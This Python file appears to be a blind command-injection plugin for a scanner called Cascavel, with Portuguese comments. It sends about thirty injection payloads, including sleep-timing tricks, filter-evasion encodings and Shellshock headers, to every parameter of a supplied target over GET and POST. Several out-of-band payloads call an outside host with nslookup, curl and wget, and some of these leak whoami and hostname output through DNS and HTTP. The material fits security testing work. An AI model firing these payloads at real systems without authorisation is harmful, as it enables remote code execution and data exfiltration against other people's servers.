# plugins/blind_rce.py — Cascavel 2026 Intelligence
import requests
import time
import urllib.parse


PARAMS = [
    "cmd", "exec", "command", "run", "ping", "ip", "host",
    "file", "path", "url", "action", "do", "query", "target",
    "daemon", "dir", "load", "func", "process", "log",
]

# ──────────── TIME-BASED SLEEP PAYLOADS ────────────
SLEEP_PAYLOADS = [
    # Classic separators
    ("; sleep 5", "SEMICOLON", 4.5),
    ("| sleep 5", "PIPE", 4.5),
    ("$(sleep 5)", "DOLLAR_PAREN", 4.5),
    ("`sleep 5`", "BACKTICK", 4.5),
    ("&& sleep 5", "AND_CHAIN", 4.5),
    ("|| sleep 5", "OR_CHAIN", 4.5),
    # Newline variants
    ("\nsleep 5\n", "NEWLINE", 4.5),
    ("%0asleep%205%0a", "URL_NEWLINE", 4.5),
    ("%0d%0asleep 5", "CRLF_NEWLINE", 4.5),
    # Ping delay
    ("& ping -c 5 127.0.0.1 &", "PING_DELAY", 4.0),
    # Quoted context escape
    ("'; sleep 5; '", "SINGLE_QUOTE_SEMI", 4.5),
    ('" || sleep 5 || "', "DOUBLE_QUOTE_PIPE", 4.5),
    ("'); sleep 5; ('", "PAREN_ESCAPE", 4.5),
    # WAF Bypass — IFS, quote split, hex
    (";sl''eep 5", "QUOTE_SPLIT_SLEEP", 4.5),
    (";sl\\eep 5", "BACKSLASH_SLEEP", 4.5),
    (";$(printf '\\x73\\x6c\\x65\\x65\\x70') 5", "HEX_PRINTF_SLEEP", 4.5),
    (";cat$IFS/dev/null;sleep$IFS'5'", "IFS_SLEEP", 4.5),
    # Wildcard glob
    (";/???/sl??p 5", "GLOB_SLEEP", 4.5),
    # Windows
    ("& timeout /T 5 /NOBREAK", "WIN_TIMEOUT", 4.5),
    ("& ping -n 5 127.0.0.1", "WIN_PING", 4.0),
]

# ──────────── OOB (DNS/HTTP Callback) PAYLOADS ────────────
OOB_PAYLOADS = [
    (";nslookup blind-rce.oob.cascavel.io", "OOB_NSLOOKUP"),
    (";curl https://oob.cascavel.io/blind", "OOB_CURL"),
    (";wget -q https://oob.cascavel.io/blind", "OOB_WGET"),
    ("$(nslookup blind.oob.cascavel.io)", "OOB_DOLLAR_DNS"),
    ("`curl oob.cascavel.io`", "OOB_BACKTICK_CURL"),
    (";ping -c 1 blind.oob.cascavel.io", "OOB_PING"),
    # DNS exfiltration pattern
    (";nslookup $(whoami).oob.cascavel.io", "OOB_DNS_EXFIL"),
    (";curl https://oob.cascavel.io/$(hostname)", "OOB_HTTP_EXFIL"),
]

# ──────────── ENCODING BYPASS PAYLOADS ────────────
ENCODING_PAYLOADS = [
    # Base64 encoded 'sleep 5'
    (";echo c2xlZXAgNQ== | base64 -d | sh", "BASE64_SLEEP", 4.5),
    # Hex encoded
    (";$(printf '\\163\\154\\145\\145\\160\\040\\065')", "OCTAL_SLEEP", 4.5),
    # Double URL encoding
    ("%253Bsleep%25205", "DOUBLE_ENCODE_SLEEP", 4.5),
]


def _test_sleep(target, param, payload, method, threshold):
    """Testa blind RCE via time-based injection em GET e POST."""
    for http_method in ["GET", "POST"]:
        url = f"http://{target}/"
        try:
            start = time.time()
            if http_method == "GET":
                _ = requests.get(url, params={param: payload}, timeout=12)
            else:
                _ = requests.post(url, data={param: payload}, timeout=12)
            elapsed = time.time() - start

            if elapsed > threshold:
                return {
                    "tipo": "BLIND_RCE", "metodo_http": http_method,
                    "tecnica": method, "parametro": param,
                    "tempo": float(f"{elapsed:.2f}"), "severidade": "CRITICO",
                    "descricao": f"Blind RCE confirmada via {method} ({http_method})!",
                }
        except requests.exceptions.Timeout:
            return {
                "tipo": "BLIND_RCE_TIMEOUT", "metodo_http": http_method,
                "tecnica": method, "parametro": param,
                "severidade": "ALTO",
                "descricao": f"Timeout após injection de {method} — possível RCE!",
            }
        except Exception:
            continue
    return None


def _inject_oob(target, param):
    """Injeta payloads OOB para detecção assíncrona de blind RCE."""
    injected = []
    for payload, method in OOB_PAYLOADS:
        for http_method in ["GET", "POST"]:
            try:
                if http_method == "GET":
                    requests.get(f"http://{target}/",
                                  params={param: payload}, timeout=5)
                else:
                    requests.post(f"http://{target}/",
                                   data={param: payload}, timeout=5)
                injected.append({"tecnica": method, "http": http_method, "payload": payload[:60]})
                break
            except Exception:
                continue
    if injected:
        return {
            "tipo": "BLIND_RCE_OOB_INJECTED", "parametro": param,
            "severidade": "ALTO",
            "descricao": "OOB callbacks injetados — verificar DNS/HTTP logs para confirmação",
            "payloads_injetados": injected,
        }
    return None


def _test_encoding_bypass(target, param):
    """Testa blind RCE com payloads codificados (base64, octal, double URL)."""
    for payload, method, threshold in ENCODING_PAYLOADS:
        vuln = _test_sleep(target, param, payload, method, threshold)
        if vuln:
            return vuln
    return None


def _test_header_blind(target):
    """Testa blind RCE via headers (User-Agent, Referer)."""
    headers_payloads = [
        ("User-Agent", "() { :; }; sleep 5", "SHELLSHOCK_UA"),
        ("Referer", "() { :; }; sleep 5", "SHELLSHOCK_REF"),
        ("User-Agent", "| sleep 5", "PIPE_SLEEP_UA"),
    ]
    for header, payload, method in headers_payloads:
        try:
            start = time.time()
            requests.get(f"http://{target}/", headers={header: payload}, timeout=10)
            elapsed = time.time() - start
            if elapsed > 4.5:
                return {
                    "tipo": "BLIND_RCE_HEADER", "header": header,
                    "tecnica": method, "severidade": "CRITICO",
                    "tempo": round(elapsed, 2),
                    "descricao": f"Blind RCE via header {header} ({method})!",
                }
        except requests.Timeout:
            return {
                "tipo": "BLIND_RCE_HEADER_TIMEOUT", "header": header,
                "tecnica": method, "severidade": "ALTO",
            }
        except Exception:
            continue
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner Blind/OOB RCE 2026-Grade — Time/OOB/Encoding/Header.

    Técnicas: 20 sleep payloads (classic + WAF bypass: IFS, quote split,
    backslash, hex printf, glob, base64 decode), 8 OOB callbacks
    (nslookup/curl/wget/ping + DNS exfiltration), encoding bypass
    (base64/octal/double URL), Shellshock via headers (User-Agent/Referer).
    GET + POST para cada payload. Windows support (timeout/ping).
    """
    _ = (ip, open_ports, banners)
    vulns = []

    for param in PARAMS:
        # 1. Time-based sleep injection
        for payload, method, threshold in SLEEP_PAYLOADS:
            vuln = _test_sleep(target, param, payload, method, threshold)
            if vuln:
                vulns.append(vuln)
                break

        # 2. Encoding bypass
        vuln = _test_encoding_bypass(target, param)
        if vuln:
            vulns.append(vuln)

        # 3. OOB injection
        if param in ["cmd", "exec", "command", "run", "ip", "host", "target"]:
            vuln = _inject_oob(target, param)
            if vuln:
                vulns.append(vuln)

    # 4. Header-based blind RCE (Shellshock + pipe)
    header_vuln = _test_header_blind(target)
    if header_vuln:
        vulns.append(header_vuln)

    return {
        "plugin": "blind_rce",
        "versao": "2026.1",
        "tecnicas": ["time_based", "oob_callback", "dns_exfil", "encoding_bypass",
                      "shellshock", "header_injection", "waf_bypass"],
        "resultados": vulns if vulns else "Nenhum blind RCE detectado",
    }
